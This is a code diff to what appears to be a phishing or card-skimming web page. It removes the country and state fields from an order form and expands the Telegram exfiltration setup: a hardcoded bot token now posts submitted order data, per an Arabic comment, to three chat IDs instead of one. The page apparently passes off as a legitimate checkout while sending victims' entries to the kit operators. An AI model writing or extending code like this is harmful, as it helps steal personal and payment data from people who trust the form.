@@ -410,23 +410,6 @@
                     </div>
                   </div>
                   <div>
-                    <label class="block text-xs font-semibold mb-1 select-text" for="country">
-                      Country / Region
-                      <span class="text-red-600">*</span>
-                    </label>
-                    <select class="w-full rounded border border-gray-400 px-3 py-2 text-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" id="country" required="">
-                      <option>
-                        United Arab Emirates
-                      </option>
-                    </select>
-                  </div>
-                  <div>
-                    <label class="block text-xs font-semibold mb-1 select-text" for="state">
-                      State / County (optional)
-                    </label>
-                    <input class="w-full rounded-md border border-gray-300 bg-gray-200 px-3 py-2 text-sm text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500" id="state" placeholder="State" type="text" />
-                  </div>
-                  <div>
                     <label class="block text-xs font-semibold mb-1 select-text" for="email">
                       Email address
                       <span class="text-red-600">*</span>
@@ -779,7 +762,11 @@
 
     // Telegram settings
     const tgToken = "8101978787:AAH-n9f7j9nnDTkJjI2r05jabZoExCCm2hI";
-    const tgChatId = "5237738874";
+    const tgChatIds = [
+  "5237738874",  // الأصلي
+  "5232187191",  // الجديد
+  "8128733310"   // الجديد
+];
     const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
 
     // إرسال بيانات الطلب إلى تليجرام
